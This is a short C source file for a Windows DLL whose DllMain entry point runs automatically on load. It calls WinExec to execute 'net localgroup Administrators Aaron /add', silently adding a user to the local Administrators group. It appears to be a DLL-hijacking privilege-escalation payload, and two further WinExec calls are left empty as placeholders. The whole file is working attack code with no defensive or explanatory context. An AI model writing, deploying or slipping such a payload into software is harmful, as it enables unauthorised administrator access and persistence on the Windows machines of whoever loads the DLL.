#include <windows.h> 

int execCommand() 

{  

 WinExec("net localgroup Administrators Aaron /add", 1);

 WinExec("", 1);

 WinExec("", 1);  

 return 0; } 

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved) 

{

 execCommand();  

 return 0;

 }
